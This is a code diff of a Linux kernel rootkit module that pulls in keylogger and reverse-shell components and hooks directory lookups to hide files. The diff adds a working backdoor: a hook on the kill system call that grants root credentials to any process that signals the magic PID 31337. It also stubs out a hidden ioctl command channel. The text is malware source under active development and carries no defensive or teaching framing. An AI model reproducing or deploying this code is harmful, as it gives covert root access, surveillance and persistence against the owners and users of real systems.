@@ -18,6 +18,8 @@
 #include <linux/unistd.h>
 #include <asm/unistd.h>
 #include <linux/signal.h>
+#include <net/inet_sock.h>
+#include <linux/net.h>
 #include "arsenal/keylogger.c"
 #include "arsenal/reverse-shell.c"
 #include "khook/engine.c"
@@ -46,7 +48,7 @@ typedef struct timer_list _timer;
  */
 
 #define POLLING_INTERVAL 1500
-#define ROOT_PRIV_ESC_MAGIC PID_MAX_DEFAULT // Highest PID on a 64-bit OS. TODO: Make 32/64 compat.
+#define MAGIC_ROOT_NUM 31337
 static _timer polling_timer;
 
 /**
@@ -75,7 +77,7 @@ MODULE_PARM_DESC(keylogger, "Toggle for keylogger.");
  * Forward declarations
  */
 
-static long get_root(void);
+static int get_root(void);
 static void poll_for_commands(unsigned long data);
 
 /**
@@ -90,6 +92,25 @@ void log_info(const char *message) {
 void log_error(const char *message) {
     printk(KERN_ERR "GARDEN: %s", message);
 }
+
+/**
+ * Handle communication from userspace command program.
+ */
+
+// KHOOK_EXT(int, inet_ioctl, struct socket *, unsigned int, unsigned long);
+// static int khook_inet_ioctl(struct socket *sock, unsigned int cmd, unsigned long arg) {
+// 	if (cmd == ROOTKIT_CMD && arg == PREP_FOR_NEXT_CMD) {
+// 		// TODO: Set flag so that next time this method is called, things can happen.
+// 		// TODO: Exit.
+// 	}
+//
+// 	// TODO: If flag is set and cmd == ROOTKIT_CMD, read action_task from
+// 	// address that arg contains with copy_from_user.
+//
+// 	// TODO: Then add a large if-else or switch statement to handle all the commands.
+// 	return KHOOK_ORIGIN(inet_ioctl, sock, cmd, arg);;
+// }
+
 
 /**
  * Hide files and directories.
@@ -156,29 +177,23 @@ struct dentry *khook___d_lookup(const struct dentry *parent, const struct qstr *
 }
 
 /**
- * Privilege Escalation with Magic Command
- */
-
-/**
  * Drops the current user into a root shell.
  */
-static long get_root(void) {
+static int get_root(void) {
 	printk(KERN_EMERG "One root coming right up.");
-	// TODO: prepare_kernel_cred and then commit_creds, in <linux/cred.c>
-	return 0;
+	return commit_creds(prepare_kernel_cred(NULL));
 }
 
-// BUG: Doesn't hook sys_kill.
-KHOOK_EXT(long, sys_kill, long, long);
-static long khook_sys_kill(long pid, long sig) {
-	printk(KERN_EMERG "sys_kill -- %s pid: %ld sig: %ld", current->comm,  pid, sig);
-	printk(KERN_EMERG "ROOT_PRIV_ESC_MAGIC is: %d", ROOT_PRIV_ESC_MAGIC);
-	if (pid == ROOT_PRIV_ESC_MAGIC) {
-		return get_root();
-	} else {
-		return KHOOK_ORIGIN(sys_kill, pid, sig);
-	}
+
+KHOOK_EXT(long, __x64_sys_kill, const struct pt_regs *);
+static long khook___x64_sys_kill(const struct pt_regs *regs) {
+        printk("sys_kill -- %s pid %ld sig %ld\n", current->comm, regs->di, regs->si);
+		if (regs->di == MAGIC_ROOT_NUM) {
+			return get_root();
+		}
+        return KHOOK_ORIGIN(__x64_sys_kill, regs);
 }
+
 
 /**
  * Timer and Command Polling Functions
@@ -229,10 +244,10 @@ __inline static void timer_cleanup_wrapper(_timer *timer) {
 static void poll_for_commands(unsigned long data) {
     // TODO: Store previous values of variables somewhere.
     log_info("Polling for commands!\n");
-	printk(KERN_EMERG "rev_shell_ip: %s", rev_shell_ip);
-	printk(KERN_EMERG "hidden_file_prefix: %s", hidden_file_prefix);
-	printk(KERN_EMERG "block_removal: %d", block_removal);
-	printk(KERN_EMERG "keylogger enabled: %d", keylogger);
+	// printk(KERN_EMERG "rev_shell_ip: %s", rev_shell_ip);
+	// printk(KERN_EMERG "hidden_file_prefix: %s", hidden_file_prefix);
+	// printk(KERN_EMERG "block_removal: %d", block_removal);
+	// printk(KERN_EMERG "keylogger enabled: %d", keylogger);
 
     // TODO: Check for change in hidden file hiding
     // TODO: Check for keylogger enabling
@@ -245,8 +260,6 @@ static void poll_for_commands(unsigned long data) {
 static int __init rootkit_init(void) {
     printk(KERN_EMERG "Initializing rootkit...\n");
     khook_init();
-
-	// sys_kill(234142, SIGQUIT);
 
     printk(KERN_EMERG "Initializing timer...\n");
     timer_init_wrapper(&polling_timer, poll_for_commands);
